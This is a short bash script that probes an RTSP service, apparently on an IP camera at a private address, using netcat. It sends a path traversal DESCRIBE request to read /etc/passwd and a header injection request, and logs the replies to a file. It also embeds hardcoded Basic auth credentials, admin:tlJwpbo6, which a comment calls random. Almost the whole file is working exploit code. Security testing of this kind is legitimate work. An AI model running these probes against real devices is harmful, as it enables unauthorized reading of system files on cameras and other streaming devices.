#!/usr/bin/env bash
set -euo pipefail

IP="192.168.2.2"
AUTH="YWRtaW46dGxKd3BibzY="               # base64(admin:tlJwpbo6) a caso
OUT="injection.txt"

: > "$OUT"
echo "=== Path Traversal Test (/etc/passwd) ===" | tee -a "$OUT"
printf 'DESCRIBE rtsp://'"$IP"'/../../../etc/passwd RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic '"$AUTH"'\r\n\r\n' \
  | nc "$IP" 554 2>&1 | tee -a "$OUT"
echo >>"$OUT"

echo "=== Header Injection Test ===" | tee -a "$OUT"
printf 'OPTIONS rtsp://'"$IP"'/ RTSP/1.0\r\nCSeq: 2\r\nUser-Agent: InjectTest\r\nX-Injected: bar\r\n\r\n' \
  | nc "$IP" 554 2>&1 | tee -a "$OUT"

echo -e "\nDone. Results in $OUT"

